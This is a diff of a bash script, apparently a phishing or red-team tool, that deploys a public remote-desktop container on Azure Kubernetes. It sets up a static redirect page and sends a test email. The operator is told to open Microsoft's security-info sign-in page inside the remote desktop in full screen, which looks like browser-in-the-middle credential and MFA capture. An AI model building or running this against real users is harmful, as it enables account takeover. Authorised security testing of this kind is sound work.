@@ -1,6 +1,6 @@
 #!/bin/bash
 ## Author Patrick Binder
-## Version 1.1
+## Version 0.7 BETA
 ## Date 2025-01-01
 ## Filename azaksmail.sh
 
@@ -53,7 +53,7 @@ check_azure_cloud_shell() {
 #                   Fancy Banner Introduction              #
 ############################################################
 display_banner() {
-    display_message "#######################################v3###################################" "cyan"
+    display_message "##############################  v07 BETA  ##################################" "cyan"
     display_message "#     ___ _____      ___    __ _______    _____ ____  ____  ____  ______   #" "cyan"
     display_message "#    /   /__  /     /   |  / //_/ ___/   / ___// __ \/ __ \/ __ \/ ____/   #" "cyan"
     display_message "#   / /| | / /     / /| | / ,<  \__ \    \__ \/ /_/ / / / / / / / /_       #" "cyan"
@@ -275,53 +275,49 @@ main() {
     
     display_message "AKS Cluster created: $aks_name" "green"
 
- # Create Kubernetes manifest for the deployment and service
-   cat <<EOF > tiny-remote-desktop-deployment.yaml
+# Deploy RDP Container
+display_message "Deploying RDP Container..." "blue"
+{
+cat <<EOF > rdp-deployment.yaml
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: tiny-remote-desktop
-  labels:
-    app: tiny-remote-desktop
+  name: rdp
 spec:
   replicas: 1
   selector:
     matchLabels:
-      app: tiny-remote-desktop
+      app: rdp
   template:
     metadata:
       labels:
-        app: tiny-remote-desktop
+        app: rdp
     spec:
       containers:
-      - name: tiny-remote-desktop
+      - name: rdp
         image: soff/tiny-remote-desktop
         ports:
         - containerPort: 6901
-        env:
-        - name: VNC_PASSWORD
-          value: "$vnc_password"
-        - name: RESOLUTION
-          value: "1920x1080"
 ---
 apiVersion: v1
 kind: Service
 metadata:
-  name: tiny-remote-desktop-service
+  name: rdp-service
 spec:
   selector:
-    app: tiny-remote-desktop
+    app: rdp
   ports:
-  - protocol: TCP
-    port: 6901
-    targetPort: 6901
+    - protocol: TCP
+      port: 6901
+      targetPort: 6901
   type: LoadBalancer
 EOF
-
-
+}
 # Apply the Kubernetes configuration
-kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1
-
+kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1 || {
+    display_message "Failed to apply Kubernetes configuration." "red"
+    exit 1
+}
 # Wait for AKS to assign a public IP
 display_message "Waiting for AKS to assign public IP..." "yellow"
 public_ip=""
@@ -330,13 +326,6 @@ while [[ -z "$public_ip" ]]; do
     sleep 10
 done
 
-display_message "AKS Public IP assigned: $public_ip" "green"
-sleep 45
-# Wait for public IP
-while [[ -z "$public_ip" ]]; do
-    public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
-    sleep 20
-done
 display_message "AKS Public IP assigned: $public_ip" "green"
 
 # Wait for the RDP container to be ready
@@ -347,7 +336,7 @@ while [[ $container_ready -eq 0 ]]; do
         container_ready=1
     else
         display_message "RDP container not ready yet. Waiting for 30 seconds..." "yellow"
-        sleep 45
+        sleep 30
     fi
 done
 display_message "RDP container is ready." "green"
@@ -378,8 +367,9 @@ display_message "Storage Account created: $storage_account_name" "green"
 # -------------------------------------------------------
 # ALWAYS recreate index.html, using the newly found $public_ip
 # -------------------------------------------------------
+# Create index.html for redirect
 display_message "Creating index.html for redirect..." "blue"
-   cat <<EOF > "$index_file"
+cat <<EOF > "$index_file"
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -394,7 +384,6 @@ display_message "Creating index.html for redirect..." "blue"
 <body></body>
 </html>
 EOF
-
 
 # Upload index.html to static website container
 az storage blob upload \
@@ -428,8 +417,8 @@ display_message "Static site redirect link: ${website_url}" "magenta"
 display_message "now navigate to rdp open https://mysignins.microsoft.com/security-info then F11" "cyan"
 display_message "############################################" "cyan"
 display_message "" "cyan"
-# Ask user about ssh connection
- display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
+# Ask user about SSH connection
+display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
 read -p "Do you want to optionally connect via SSH to the cluster node? (yes/no): " next_step
 if [[ "$next_step" == "yes" ]]; then
     display_message "Proceeding with SSH connection attempt." "blue"
@@ -451,11 +440,13 @@ if [[ "$next_step" == "yes" ]]; then
     chmod 600 "$ssh_key_name"
     
     display_message "Attempting to connect to azureuser@$public_ip ..." "blue"
-    ssh -i "$ssh_key_name" azureuser@"$public_ip"
+    ssh -i "$ssh_key_name" azureuser@"$public_ip" || {
+        display_message "SSH connection failed." "red"
+        exit 1
+    }
 else
     display_message "Exiting script as per user choice." "green"
     exit 0
 fi
 }
-
 main "$@"
